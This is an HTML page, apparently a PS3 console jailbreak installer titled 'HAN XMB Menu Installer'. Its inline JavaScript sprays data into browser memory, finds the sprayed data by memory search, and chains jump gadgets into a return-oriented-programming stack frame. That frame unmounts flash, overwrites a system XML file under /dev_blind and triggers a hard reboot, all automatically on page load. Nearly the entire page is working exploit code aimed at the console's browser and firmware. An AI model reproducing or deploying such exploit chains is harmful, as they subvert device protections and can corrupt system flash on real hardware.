<!DOCTYPE html>
<html>
  <head>
    <script src="js/ps3xploit_v30.js"></script>
    <meta charset="UTF-8" />
    <title>HAN XMB Menu Installer</title>
    <style>
      body,
      html {
        height: 100%;
        margin: 0;
        overflow: hidden;
        padding: 0;
        font-size: 32px !important;
      }
      html {
        display: table;
        width: 100%;
      }
      body {
        background-color: #206ee3;
        display: table-cell;
        text-align: center;
        vertical-align: middle;
      }
      h1,
      h2,
      h3 {
        margin: 0;
        padding: 0;
        font-size: 32px;
        color: white;
        font-weight: 100;
      }
      h2,
      h3 {
        font-size: 24px;
      }
    </style>
    <script>
      var menuFile = getUrlParameter("xml");
      if (menuFile === "") {
        menuFile = "category_game_han.xml";
      }
      function getUrlParameter(name) {
        name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
        var regex = new RegExp("[\\?&]" + name + "=([^&#]*)");
        var results = regex.exec(location.search);
        return results === null
          ? ""
          : decodeURIComponent(results[1].replace(/\+/g, " "));
      }
      function initROP(init) {
        try {
          if (init === true) {
            frame_fails = 0;
            search_base_off = 0;
            search_size_ext = 0;
          }
          if (t_out !== 0) {
            clearTimeout(t_out);
            t_out = 0;
          }
          offset_array = [];
          disable_all();
          clearLogEntry();
          store_idx_arr1 = new Array(1);
          store_idx_arr2 = new Array(1);
          xtra_data_addr = 0;
          stack_frame_addr = 0;
          jump_2_addr = 0;
          jump_1_addr = 0;

          var search_max_threshold = 70 * 0x100000; // 70Mb maximum memory search
          var search_base = 0x80200000; //0x80190000;//
          var search_size = 2 * mbytes;
          search_base_off = 0 * mbytes;
          search_size_ext = 2 * mbytes;
          total_loops++;

          // Overwrite filename and destination path here
          template_1_file_usb = "/localSTORE/hen-files/" + menuFile;
          template_1_file_blind =
            "/dev_blind/vsh/resource/explore/xmb/category_game.xml";

          xtra_data =
            flash_partition.convert() +
            filesystem.convert() +
            mount_path.convert() +
            getPath(template_1_file_usb).convert() +
            fill_by_4bytes(0xc, dbyte00) +
            template_1_file_blind.convert() +
            make_dummy_xtra2() +
            fill_by_16bytes(0x70, dbyte00) +
            hexdw2bin(sp_exit) +
            fill_by_8bytes(0x8, dbyte41) +
            callsub(gadget12_addr, 2, 0, 0, 0, 0, 0, 0, 0, 0, 0x80) +
            syscall(sc_sm_shutdown, hard_reboot, 0, 0, 0, 0, 0, 0, 0) +
            unescape("\uFD7E");
          while (xtra_data_addr === 0) {
            if (search_max_threshold < search_size) {
              load_check();
              return;
            }
            xtra_data = xtra_data.replaceAt(0, hexh2bin(0x7efd));
            xtra_data_addr = findJsVariableOffset(
              "xtra_data",
              xtra_data,
              search_base,
              search_size
            );
            search_max_threshold -= search_size;
          }

          flash_partition_addr = xtra_data_addr;
          fs_addr =
            flash_partition_addr + flash_partition.convertedSize() - 0x4;
          mount_path_addr = fs_addr + filesystem.convertedSize();

          template_1_file_usb_addr =
            mount_path_addr + mount_path.convertedSize();
          template_1_file_usbfd_addr =
            template_1_file_usb_addr +
            getPath(template_1_file_usb).convertedSize();
          template_1_file_usb_readlen_addr =
            template_1_file_usbfd_addr + word_size;

          template_1_file_blind_addr =
            template_1_file_usb_readlen_addr + dword_size;
          template_1_file_blindfd_addr =
            template_1_file_blind_addr + template_1_file_blind.convertedSize();
          template_1_file_blind_writelen_addr =
            template_1_file_blindfd_addr + word_size;
          store_idx_arr1[0] =
            (template_1_file_blind_writelen_addr - flash_partition_addr + 0x8) /
            2;

          null_addr =
            template_1_file_blind_writelen_addr +
            dword_size +
            make_dummy_null_padding2() +
            dword_size;

          store_idx_arr2[0] = (null_addr - flash_partition_addr + 0xc) / 2;
          stat_addr = null_addr + dword_size * 0x3;
          reboot_sf_addr = stat_addr + dword_size * 0xb;
          //############################ Building stack frame ###############################################################
          stack_frame =
            stack_frame_hookup() +
            syscall(
              sc_fs_umount,
              flash_partition_addr,
              fs_addr,
              mount_path_addr,
              0,
              0,
              0,
              0,
              0
            ) +
            copy_file_overwrite(
              template_1_file_usb_addr,
              template_1_file_blind_addr,
              template_1_file_usbfd_addr,
              template_1_file_blindfd_addr,
              template_1_file_buf_addr,
              template_1_file_usb_readlen_addr,
              template_1_file_blind_writelen_addr,
              stat_addr,
              null_addr,
              null_addr + 0x8
            ) +
            optional_reboot1(
              reboot_sf_addr,
              template_1_file_blind_writelen_addr
            ) +
            stack_frame_exit();
          //############################ End stack frame ###############################################################

          while (stack_frame_addr === 0) {
            if (search_max_threshold < search_size + search_size_ext) {
              frame_fails++;
              if (frame_fails % 10 === 0) {
                search_base_off += 0;
                search_size_ext += 0;
              }
              load_check();
              return;
            }
            stack_frame = stack_frame.replaceAt(0, hexh2bin(0x2a2f));
            stack_frame_addr = findJsVariableOffset(
              "stack_frame",
              stack_frame,
              search_base + search_base_off,
              search_size + search_size_ext
            );
            if (stack_frame_addr == -1)
              if (search_max_threshold < search_size + search_size_ext) {
                frame_fails++;
                load_check();
                return;
              }
            search_max_threshold -= search_size + search_size_ext;
          }
          jump_2 =
            unescape("\u0102\u7EFB") +
            fill_by_16bytes(0x30, dbyte41) +
            hexw2bin(stack_frame_addr) +
            unescape("\uFB7E");
          while (jump_2_addr === 0) {
            if (search_max_threshold < search_size) {
              load_check();
              return;
            }
            jump_2 = jump_2.replaceAt(0, hexh2bin(0x7efb));
            jump_2_addr = findJsVariableOffset(
              "jump_2",
              jump_2,
              search_base,
              search_size
            );
            if (jump_2_addr == -1)
              if (search_max_threshold < search_size) {
                load_check();
                return;
              }
            search_max_threshold -= search_size;
          }
          jump_1 =
            unescape("\u4141\u7EFA") +
            hexw2bin(jump_2_addr) +
            unescape("\uFA7E");
          while (jump_1_addr === 0) {
            if (search_max_threshold < search_size) {
              load_check();
              return;
            }
            jump_1 = jump_1.replaceAt(0, hexh2bin(0x7efa));
            jump_1_addr = findJsVariableOffset(
              "jump_1",
              jump_1,
              search_base,
              search_size
            );
            if (jump_1_addr == -1)
              if (search_max_threshold < search_size) {
                load_check();
                return;
              }
            search_max_threshold -= search_size;
          }
          var sf = checkMemory(
            stack_frame_addr - 0x4,
            0x10000,
            stack_frame.length
          );
          var x = checkMemory(xtra_data_addr - 0x4, 0x2000, xtra_data.length);
          var j2 = checkMemory(jump_2_addr - 0x4, 0x800, jump_2.length);
          var j1 = checkMemory(jump_1_addr - 0x4, 0x800, jump_1.length);
          if (
            j2 === jump_2 &&
            j1 === jump_1 &&
            x === xtra_data &&
            sf === stack_frame
          ) {
            if (t_out !== 0) {
              clearTimeout(t_out);
            }
            showResult("<h1>Flash XML Replacer initialized successfully.</h1>");
            triggerX();
          } else {
            if (x !== xtra_data) logAdd("xtra_data mismatch in memory!");
            if (sf !== stack_frame) logAdd("stack_frame mismatch in memory!");
            if (j2 !== jump_2) logAdd("jump_2 mismatch in memory!");
            if (j1 !== jump_1) logAdd("jump_1 mismatch in memory!");
            //logAdd("String mismatch in memory!");
            load_check();
          }
        } catch (e) {
          debug = true;
          logAdd(
            br +
              "Flash XML Replacer initialization failed because the following exception was thrown during execution:" +
              br +
              e +
              " at : " +
              e.lineNumber
          );
          debug = false;
        }
      }

      function triggerX() {
        clearLogEntry();
        showResult("<h2>Copying XML File To Flash...</h2>");
        disable_all();
        setTimeout(trigger, 1000, jump_1_addr);
        setTimeout(
          rop_exit_1val,
          2000,

          "<h1>Flash XML Replacer succeeded!</h1>",

          "<h1><b><font color='red'>Flash XML Replacer failed!!!!!</font></b></h1><h3><b><span style='color:#000000;'>Error copying file(s):</span></b></h3>",
          "<h3><b><span style='color:#000000;'>" +
            getdestFile() +
            " to " +
            template_1_file_blind +
            "</span></b></h3>"
        );
        cleanGUI();
      }
    </script>
  </head>
  <body id="bodyId" style="background-color:#206ee3">
    <b style="display:none;">Select Source XML File:</b><br />
    <select
      name="dpath"
      id="combodestFile"
      onchange="getdestFile();"
      style="display:none;"
    >
      <option value="category_game.xml">category_game.xml</option>
    </select>

    <p style="display:none;">
      <span style="color:#000000"><b>Root Path</b> </span>
      <select
        id="combofilePath"
        name="fPath"
        size="1"
        onChange="selectfilePath()"
      >
        <option id="usb_0" selected="selected" value="/dev_usb000"
          >/dev_usb000</option
        >
      </select>
      | Auto-Close Browser
      <input
        type="checkbox"
        id="auto_close"
        name="aclose"
        onclick="autoclose();"
      />
      | Auto-Reboot
      <input
        type="checkbox"
        id="auto_reboot"
        name="areboot"
        checked="checked"
        onclick="autoreboot();"
      />
      <span id="dex_txt" style="visibility:hidden">
        | DEX mode<input
          type="checkbox"
          id="dex"
          name="DEX"
          disabled=""
          onclick="dex();"
      /></span>
    </p>
    <p style="display: none;">
      <button id="btnROP" type="button" onclick="initROP(true);">
        Initialize Flash XML Replacer
      </button>
      |
      <button id="btnTrigger" disabled="" type="button" onclick="triggerX();">
        Copy XML File To Flash</button
      ><span id="reset" style="visibility:hidden">
        |
        <button id="btnReset" type="button" onclick="disable_trigger();">
          Reset
        </button></span
      >
    </p>
    <div id="result" style="color:#CC2010"></div>
    <br />
    <div id="log"></div>
    <div id="exploit"></div>
    <div id="trigger"></div>
    <div id="footer" style="display:none;"></div>
    <script>
      var installingCaption =
        menuFile === "category_game_han.xml" ? "Installer" : "Uninstaller";
      var fail_msg_frag =
        '<h1>Exploit Initialization FAILED!!!</h1><h2><a href="javascript:window.location.reload();" style="color:white; tex-decoration:underline">Refresh this page</a> & try again...</h2>';
      var progress_msg_frag1 =
        "<h2>HEN localSTORE XMB Menu " + installingCaption + "</h2>" + "<h2>";
      var progress_msg_frag2 = "%</span>";
      function alert() {}
      writeEnvInfo();
      ps3chk();
      initROP(true);
    </script>
  </body>
</html>
